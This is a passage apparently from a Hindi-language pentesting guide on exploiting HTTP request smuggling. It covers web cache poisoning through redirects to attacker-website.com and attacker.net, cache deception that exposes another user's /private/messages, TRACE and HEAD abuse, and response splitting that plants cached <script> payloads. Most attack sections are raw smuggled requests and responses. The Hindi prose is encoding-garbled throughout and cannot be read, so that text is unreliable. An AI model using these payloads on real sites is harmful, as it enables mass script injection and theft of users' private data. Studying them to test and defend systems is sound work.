Host: attacker-website.com
Foo: X
```
рдпрд╣ рдЪреЛрд░реА рдЧрдИ рдЕрдиреБрд░реЛрдз рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдЕрдЧрд▓реЗ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
рдкрд░рд┐рдгрд╛рдо:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### рдПрдЪрдЯреАрдЯреАрдкреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд╛ рд╢реЛрдз <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ **рдлреНрд░рдВрдЯ-рдПрдВрдб рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХрд╛ рдХреЛрдИ рднрд╛рдЧ рд╕рд╛рдордЧреНрд░реА рдХреИрд╢ рдХрд░рддрд╛ рд╣реИ**, рд╕рд╛рдорд╛рдиреНрдпрдд: рдкреНрд░рджрд░реНрд╢рди рдХреЛ рдмреЗрд╣рддрд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдПред рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдореЛрдбрд╝рдХрд░ рджреНрд╡рд╛рд░рд╛, рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ **рдХреИрд╢ рдХреЛ рдкреЙрдЗрдЬрд╝рди** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдкрд╣рд▓реЗ рд╣рдордиреЗ рджреЗрдЦрд╛ рдХрд┐ рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреИрд╕реЗ рдмрджрд▓реА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рддрд╛рдХрд┐ 404 рддреНрд░реБрдЯрд┐ рд▓реМрдЯрд╛рдИ рдЬрд╛ рд╕рдХреЗ (рд╕рдВрджрд░реНрдн рдХреЗ рд▓рд┐рдП [рдореВрд▓ рдЙрджрд╛рд╣рд░рдг](./#basic-examples) рджреЗрдЦреЗрдВ)ред рдЙрд╕реА рддрд░рд╣, рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдХрд░ `/static/include.js` рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдкрд░ `/index.html` рд╕рд╛рдордЧреНрд░реА рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛред рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, `/static/include.js` рд╕рд╛рдордЧреНрд░реА рдХреЛ `/index.html` рдХреА рд╕рд╛рде рдХреИрд╢ рдореЗрдВ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ `/static/include.js` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЕрдЧрдВрддреБрдХ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ рдбреАрдирд╛рдпрд▓ рдСрдл рд╕рд░реНрд╡рд┐рд╕ (DoS) рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рддрдХрдиреАрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдкреНрд░рднрд╛рд╡реА рд╣реЛ рдЬрд╛рддреА рд╣реИ рдЕрдЧрд░ **рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖** рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рдпрджрд┐ **рдУрди-рд╕рд╛рдЗрдЯ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЛ рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдРрд╕реА рдХрдорд┐рдпреЛрдВ рдХрд╛ рд╢реЛрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ `/static/include.js` рдХреИрд╢ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдореВрд▓ рд░реВрдк рд╕реЗ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реНрдпрд╛рдкрдХ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ (XSS) рд╣рдорд▓рд╛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдбреЗрдЯ рдХрд┐рдП рдЧрдП `/static/include.js` рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдлред

рдиреАрдЪреЗ **рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде рдУрди-рд╕рд╛рдЗрдЯ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЛ рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЪрд┐рддреНрд░рдг рд╣реИред рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдХрд┐ `/static/include.js` рдХреИрд╢ рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕реЗрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рдП:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдПрдореНрдмреЗрдбреЗрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ `/post/next?postId=3` рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ `/post?postId=4` рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, **рд╣реЛрд╕реНрдЯ рд╣реЗрдбрд░ рдорд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред **рд╣реЛрд╕реНрдЯ рд╣реЗрдбрд░** рдХреЛ рдмрджрд▓рдХрд░, рд╣рдорд▓рд╛рд╡рддрд╛ рдЕрдкрдиреЗ рдбреЛрдореЗрди рдкрд░ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (**рдСрди-рд╕рд╛рдЗрдЯ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╕реЗ рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ**ред)

рд╕рдлрд▓ **рд╕реЙрдХреЗрдЯ рдкреЙрдЗрдЬрдирд┐рдВрдЧ** рдХреЗ рдмрд╛рдж, `/static/include.js` рдХреЗ рд▓рд┐рдП **рдЬреАрдИрдЯреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ** рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдкреВрд░реНрд╡ **рдСрди-рд╕рд╛рдЗрдЯ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╕реЗ рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджреВрд╖рд┐рдд рд╣реЛрдЧрд╛ рдФрд░ рд╣рдорд▓рд╛рд╡рддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ред

рдЗрд╕рдХреЗ рдмрд╛рдж, `/static/include.js` рдХреЗ рд▓рд┐рдП рдХреЛрдИ рднреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╣рдорд▓рд╛рд╡рддрд╛ рдХреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдХреИрд╢ рдХреА рд╕рд╛рдордЧреНрд░реА рд╕реЗрд╡ рдХрд░реЗрдЧрд╛, рдЬрд┐рд╕рд╕реЗ рд╡реНрдпрд╛рдкрдХ рдПрдХреНрд╕рдПрд╕рдПрд╕ рд╣рдорд▓рд╛ рд╢реБрд░реВ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

### рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдЪрдЯреАрдЯреАрдкреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрдирд┐рдВрдЧ рдФрд░ рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА рдореЗрдВ рдХреНрдпрд╛ рдЕрдВрддрд░ рд╣реИ?**
>
> * **рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрдирд┐рдВрдЧ** рдореЗрдВ, рд╣рдорд▓рд╛рд╡рддрд╛ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рдХреБрдЫ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрд╢ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдпрд╣ рд╕рд╛рдордЧреНрд░реА рдХреИрд╢ рд╕реЗ рдЕрдиреНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред
> * **рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА** рдореЗрдВ, рд╣рдорд▓рд╛рд╡рддрд╛ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрд╢ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рддрд╛ рдЗрд╕ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрд╢ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред

рд╣рдорд▓рд╛рд╡рддрд╛ рдПрдХ рд╕реНрдордЧрд▓рд┐рдВрдЧ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рддреИрдпрд╛рд░ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдХрд╛ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
рдпрджрд┐ рдпрд╣ рдЧреБрдкреНрддрд┐рдЪрд╛рд░реА рдЕрдиреБрд░реЛрдз рдХреИрд╢ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рджреБрд░рд╕реНрдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд▓рд┐рдП рд╣реЛ (рдЙрджрд╛., `/someimage.png`), рддреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ `/private/messages` рд╕реНрдерд╛рдпреА рд╕рд╛рдордЧреНрд░реА рдХреА рдХреИрд╢ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЗ рддрд╣рдд рдХреИрд╢ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╣рдорд▓рд╛рд╡рд╛рджреА рдЗрди рдХреИрд╢ рдХрд┐рдП рдЧрдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ TRACE рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ**](https://portswigger.net/research/trace-desync-attack) рд╕реБрдЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдпрджрд┐ рд╕рд░реНрд╡рд░ рдореЗрдВ TRACE рд╡рд┐рдзрд┐ рд╕рдХреНрд╖рдо рд╣реИ рддреЛ рдЗрд╕реЗ HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рд╡рд┐рдзрд┐ рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬреЗ рдЧрдП рдХрд┐рд╕реА рднреА рд╣реЗрдбрд░ рдХреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╢рд░реАрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░реЗрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рднреЗрдЬреЗрдВрдЧреЗ рдЬреИрд╕реЗ:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ **рдкрд╣рд▓реЗ рдПрдХ HEAD рдЕрдиреБрд░реЛрдз smuggle рдХрд░рдирд╛**ред рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдХреЗрд╡рд▓ **рд╣реЗрдбрд░реНрд╕** рдПрдХ GET рдЕрдиреБрд░реЛрдз рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рддрд┐рд╕рд╛рдж рдорд┐рд▓реЗрдЧрд╛ (**`Content-Type`** рдореЗрдВ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИ)ред рдФрд░ **рдлрд┐рд░ рддреБрд░рдВрдд HEAD рдХреЗ рдмрд╛рдж рдПрдХ TRACE рдЕрдиреБрд░реЛрдз smuggle рдХрд░рдирд╛**, рдЬреЛ **рднреЗрдЬреЗ рдЧрдП рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рдХрд░реЗрдЧрд╛**ред\
рдХреНрдпреЛрдВрдХрд┐ HEAD рдкреНрд░рддрд┐рд╕рд╛рдж рдореЗрдВ `Content-Length` рд╣реЗрдбрд░ рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП **TRACE рдЕрдиреБрд░реЛрдз рдХрд╛ рдкреНрд░рддрд┐рд╕рд╛рдж HEAD рдкреНрд░рддрд┐рд╕рд╛рдж рдХреЗ рд╢рд░реАрд░ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣реГрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдкреНрд░рддрд┐рд╕рд╛рдж рдореЗрдВ рдЕрдирд┐рдпрдорд┐рдд рдбреЗрдЯрд╛ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рд╣реЛрдЧрд╛**ред \
рдпрд╣ рдкреНрд░рддрд┐рд╕рд╛рдж рдЕрдЧрд▓реЗ рдХрдиреЗрдХреНрд╢рди рдкрд░ рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ **рдПрдХ рдХреИрд╢реНрдб JS рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдирд┐рдпрдорд┐рдд JS рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред

### HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реНрдкреНрд▓рд┐рдЯрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ TRACE рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://portswigger.net/research/trace-desync-attack) рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд░рд╣рдирд╛ рд╕реБрдЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ TRACE рд╡рд┐рдзрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЬреИрд╕рд╛ рдХреА рдЯрд┐рдкреНрдкрдгреА рдХреА рдЧрдИ рд╣реИ, HEAD рдЕрдиреБрд░реЛрдз рдФрд░ TRACE рдЕрдиреБрд░реЛрдз smuggle рдХрд░рдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ **рд╣реЗрдб рдЕрдиреБрд░реЛрдз рдХреЗ рдкреНрд░рддрд┐рд╕рд╛рдж рдореЗрдВ рдХреБрдЫ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рдбреЗрдЯрд╛ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**ред рд╣реЗрдб рдЕрдиреБрд░реЛрдз рдХреЗ рд╢рд░реАрд░ рдХреА рд▓рдВрдмрд╛рдИ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ `Content-Length` рд╣реЗрдбрд░ рдореЗрдВ рд╕реВрдЪрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ рдпрд╣ TRACE рдЕрдиреБрд░реЛрдз рдХреЗ рдкреНрд░рддрд┐рд╕рд╛рдж рд╕реЗ рдмрдирддреА рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдирдИ рд╡рд┐рдЪрд╛рд░рдзрд╛рд░рд╛ рдпрд╣ рд╣реЛрдЧреА рдХрд┐, рдЗрд╕ Content-Length рдФрд░ TRACE рдкреНрд░рддрд┐рд╕рд╛рдж рдореЗрдВ рджрд┐рдП рдЧрдП рдбреЗрдЯрд╛ рдХреЛ рдЬрд╛рдирддреЗ рд╣реБрдП, TRACE рдкреНрд░рддрд┐рд╕рд╛рдж рдореЗрдВ рдПрдХ рдорд╛рдиреНрдп HTTP рдкреНрд░рддрд┐рд┐рдХреНрд░рд┐рдпрд╛ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдХреЗ рдЕрдВрддрд┐рдо рдмрд╛рдЗрдЯ рдХреЗ рдмрд╛рдж Content-Length, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ (рдЬрд┐рд╕реЗ рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред

рдЙрджрд╛рд╣рд░рдг:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
рдпрд╣ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ HEAD рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ Content-Length рд╣реИ рдЬрд┐рд╕рд╕реЗ TRACE рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ HEAD рд╢рд░реАрд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдмрдирддреА рд╣реИ рдФрд░ рдПрдХ рд╡реИрдз HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЬрдм HEAD Content-Length рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ smuggled рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(тАЬarbitrary responseтАЭ)</script>
```
### HTTP рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХреЛ рдПрдЪрдЯреАрдЯреАрдкреА рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рдбрд┐рд╕реЗрдВрдХреНрд░реЛрдирд╛рдЗрдЬреЗрд╢рди рдХреЗ рд╕рд╛рде рд╣рдерд┐рдпрд╛рдирд╛

рдХреНрдпрд╛ рдЖрдкрдиреЗ рдХреЛрдИ рдПрдЪрдЯреАрдЯреАрдкреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреА рдЦреЛрдЬреА рд╣реИ рдФрд░ рдЖрдк рдЗрд╕реЗ рдХреИрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░реЗрдВ, рдЗрд╕рдХрд╛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди рд╡рд┐рдзрд┐ рдХреЛ рдЖрдЬрдорд╛рдПрдВ:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### рдЕрдиреНрдп HTTP рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рддрдХрдиреАрдХреЗрдВ

